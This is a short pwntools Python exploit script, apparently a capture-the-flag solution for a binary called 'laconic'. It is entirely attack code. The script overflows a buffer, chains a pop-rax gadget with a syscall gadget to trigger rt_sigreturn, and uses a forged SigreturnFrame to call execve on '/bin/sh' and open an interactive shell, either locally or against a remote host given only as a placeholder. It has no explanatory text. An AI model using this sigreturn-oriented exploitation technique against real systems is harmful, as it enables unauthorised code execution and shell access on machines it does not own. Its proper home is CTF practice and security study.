from pwn import *

elf =context.binary = ELF('./laconic')

def start():
    if args.GDB:
        return gdb.debug(elf.path)
    elif args.REMOTE:
        return remote('IP', port)
    else:
        return process()
    
rop = ROP(elf)

POP_RAX =0x0043018
SYSCALL_RET=0x043015
BINSH = elf.address + 0x1238

log.info("POP_RAX: " + hex(POP_RAX))
log.info("SYSCALL_RET: " + hex(SYSCALL_RET))
log.info("BINSH: " + hex(BINSH))
p = start()

payload = b'a'*0x8
payload += p64(POP_RAX)
payload += p64(0xf)
payload += p64(SYSCALL_RET)

frame = SigreturnFrame()
frame.rax = 0x3b           
frame.rdi = BINSH          
frame.rsi = 0x0             
frame.rdx = 0x0 
frame.rip = SYSCALL_RET   

payload += bytes(frame)
p.sendline(payload)
p.interactive()
